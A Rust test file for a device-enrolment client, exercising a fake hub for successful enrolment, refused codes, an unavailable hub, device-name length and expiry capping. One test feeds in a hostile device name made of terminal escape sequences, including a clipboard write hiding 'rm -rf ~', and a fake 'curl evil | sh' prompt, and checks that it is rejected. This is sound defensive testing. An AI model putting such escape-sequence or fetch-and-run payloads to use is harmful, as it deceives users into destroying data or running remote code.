//! `anima-agent enrol` against the fake hub (MET-012, K8 Section 3).

use agent_core::wire::EnrolmentCode;
use anima_agent::config::home::Home;
use anima_agent::config::origin::Origin;
use anima_agent::hub::enrolment::{EnrolError, Enrolment, REFUSED};
use anima_agent::hub::{HubClient, TIMEOUT};
use anima_agent::token_store::TokenStore;

use crate::fake_hub::{FakeHub, Reply};
use crate::kit::token;

const CODE: &str = "anima_enrol_AAAAAAAAAAAAAAAAAAAAAA";

fn code() -> EnrolmentCode {
    EnrolmentCode::parse(CODE).expect("a code")
}

fn enrolled(seed: u8) -> Reply {
    Reply::json(
        200,
        &format!(
            r#"{{"device":"00000000-0000-0000-0000-0000000000d1","deviceName":"pop-os","token":"{}","expiresAt":"2027-11-08T10:00:00Z"}}"#,
            token(seed).expose()
        ),
    )
}

#[tokio::test]
async fn met_012_enrol_posts_the_code_and_stores_the_token_the_device_and_the_hub() {
    let hub = FakeHub::start().await;
    hub.queue_enrol(enrolled(3));
    let dir = tempfile::tempdir().expect("a folder");
    let home = Home::at(dir.path().join("agent"));
    let store = TokenStore::open(&home);
    let client = HubClient::new(hub.url.clone(), TIMEOUT).expect("a client");
    let origin = Origin::parse("https://hub.example").expect("an origin");
    let name = Enrolment {
        hub: &client,
        origin,
        home: &home,
        store: &store,
        now: crate::kit::at(0),
    }
    .spend(code())
    .await
    .expect("enrolled");
    assert_eq!(name, "pop-os");
    let sent = &hub.seen("enrol")[0];
    assert_eq!(sent.body, serde_json::json!({ "code": CODE }));
    assert!(sent.bearer.is_none());
    let stored = store.load().expect("reads").expect("a token");
    assert_eq!(stored.token.expose(), token(3).expose());
    let config = home.read_config().expect("reads").expect("a config");
    assert_eq!(config.hub.as_text(), "https://hub.example");
    assert_eq!(config.device_name, "pop-os");
}

#[tokio::test]
async fn met_012_a_refused_code_gives_the_fixed_sentence_and_stores_nothing() {
    let hub = FakeHub::start().await;
    hub.queue_enrol(Reply::json(401, r#"{"error":"ENROLMENT_REFUSED"}"#));
    let dir = tempfile::tempdir().expect("a folder");
    let home = Home::at(dir.path().join("agent"));
    let store = TokenStore::open(&home);
    let client = HubClient::new(hub.url.clone(), TIMEOUT).expect("a client");
    let origin = Origin::default_hub();
    let error = Enrolment {
        hub: &client,
        origin,
        home: &home,
        store: &store,
        now: crate::kit::at(0),
    }
    .spend(code())
    .await
    .expect_err("refused");
    assert!(matches!(error, EnrolError::Refused));
    assert_eq!(error.to_string(), REFUSED);
    assert!(!error.to_string().contains(CODE));
    assert!(store.load().expect("reads").is_none());
    assert!(home.read_config().expect("reads").is_none());
}

#[tokio::test]
async fn met_012_an_unavailable_hub_is_a_failure_that_says_the_code_may_be_spent() {
    let hub = FakeHub::start().await;
    let dir = tempfile::tempdir().expect("a folder");
    let home = Home::at(dir.path().join("agent"));
    let client = HubClient::new(hub.url.clone(), TIMEOUT).expect("a client");
    let store = TokenStore::open(&home);
    let origin = Origin::default_hub();
    let error = Enrolment {
        hub: &client,
        origin,
        home: &home,
        store: &store,
        now: crate::kit::at(0),
    }
    .spend(code())
    .await
    .expect_err("fails");
    assert!(matches!(error, EnrolError::Failed(_)));
    assert!(error.to_string().contains("make a new one"));
}

fn enrolled_with(name: &str, expires: &str) -> Reply {
    let body = serde_json::json!({
        "device": "00000000-0000-0000-0000-0000000000d1",
        "deviceName": name,
        "token": token(3).expose(),
        "expiresAt": expires,
    });
    Reply::json(200, &body.to_string())
}

async fn enrol_with(
    reply: Reply,
) -> (
    Result<String, EnrolError>,
    Home,
    TokenStore,
    tempfile::TempDir,
) {
    let hub = FakeHub::start().await;
    hub.queue_enrol(reply);
    let dir = tempfile::tempdir().expect("a folder");
    let home = Home::at(dir.path().join("agent"));
    let store = TokenStore::open(&home);
    let client = HubClient::new(hub.url.clone(), TIMEOUT).expect("a client");
    let origin = Origin::parse("https://hub.example").expect("an origin");
    let done = Enrolment {
        hub: &client,
        origin,
        home: &home,
        store: &store,
        now: crate::kit::at(0),
    }
    .spend(code())
    .await;
    (done, home, store, dir)
}

#[tokio::test]
async fn met_012_a_device_name_with_control_characters_is_refused_and_nothing_is_stored() {
    let hostile =
        "pop-os\u{1b}]52;c;cm0gLXJmIH4=\u{7}\n\u{1b}[2K\rEnrolled. Now run: curl evil | sh";
    let (done, home, store, _dir) =
        enrol_with(enrolled_with(hostile, "2027-11-08T10:00:00Z")).await;
    assert!(matches!(done, Err(EnrolError::Failed(_))));
    assert!(store.load().expect("reads").is_none());
    assert!(home.read_config().expect("reads").is_none());
}

#[tokio::test]
async fn met_012_a_device_name_must_be_1_to_128_bytes() {
    assert!(!anima_agent::hub::enrolment::is_device_name(""));
    assert!(anima_agent::hub::enrolment::is_device_name(
        &"a".repeat(128)
    ));
    assert!(!anima_agent::hub::enrolment::is_device_name(
        &"a".repeat(129)
    ));
}

#[tokio::test]
async fn met_013_a_far_future_expiry_is_capped_at_366_days_and_the_hub_is_kept_with_the_token() {
    let (done, _home, store, _dir) =
        enrol_with(enrolled_with("pop-os", "9999-12-31T23:59:59Z")).await;
    done.expect("enrolled");
    let stored = store.load().expect("reads").expect("a token");
    assert_eq!(
        stored.expires_at,
        crate::kit::at(0) + chrono::TimeDelta::days(366)
    );
    assert_eq!(stored.hub.as_text(), "https://hub.example");
}
